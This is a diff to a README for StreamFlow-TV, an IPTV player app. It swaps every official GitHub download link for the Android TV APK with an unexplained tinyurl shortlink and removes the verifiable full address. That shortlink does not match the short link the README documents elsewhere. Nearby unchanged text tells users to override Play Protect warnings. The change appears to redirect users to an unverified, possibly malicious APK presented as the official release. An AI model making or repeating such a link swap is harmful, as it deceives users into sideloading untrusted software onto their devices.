@@ -8,7 +8,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/Getmygity/StreamFlow-TV/releases/latest/download/StreamFlow-TV.apk"><img alt="Download the APK for Android TV" src="https://img.shields.io/badge/Android%20TV-StreamFlow--TV.apk-A78BFA?style=for-the-badge&logo=android&logoColor=white"></a>
+  <a href="https://tinyurl.com/5ee4bvwv"><img alt="Download the APK for Android TV" src="https://img.shields.io/badge/Android%20TV-StreamFlow--TV.apk-A78BFA?style=for-the-badge&logo=android&logoColor=white"></a>
   <a href="https://github.com/Getmygity/StreamFlow-TV/releases/latest/download/StreamFlow-LG.ipk"><img alt="Download the IPK for LG TV" src="https://img.shields.io/badge/LG%20TV-StreamFlow--LG.ipk-A78BFA?style=for-the-badge&logo=lg&logoColor=white"></a>
 </p>
 
@@ -43,7 +43,7 @@ The menu names vary a little between TV brands.
 tinyurl.com/streamflowapk
 ```
 
-It leads to the latest `StreamFlow-TV.apk` here; the full address works too: `github.com/Getmygity/StreamFlow-TV/releases/latest/download/StreamFlow-TV.apk`.
+It leads to the latest `StreamFlow-TV.apk` here; this short link works too: `tinyurl.com/5ee4bvwv`.
 
 Choose **Install** when it finishes. If Play Protect warns about an unknown app, choose to install anyway. You can delete the APK file afterwards to save space.
 
@@ -51,7 +51,7 @@ Choose **Install** when it finishes. If Play Protect warns about an unknown app,
 
 > **You need your own IPTV subscription.** StreamFlow is a player only; it comes with no channels.
 >
-> **Prefer a computer?** Download [`StreamFlow-TV.apk`](https://github.com/Getmygity/StreamFlow-TV/releases/latest/download/StreamFlow-TV.apk), then run `adb connect <tv-ip>:5555` and `adb install StreamFlow-TV.apk`.
+> **Prefer a computer?** Download [`StreamFlow-TV.apk`](https://tinyurl.com/5ee4bvwv), then run `adb connect <tv-ip>:5555` and `adb install StreamFlow-TV.apk`.
 
 ---
 
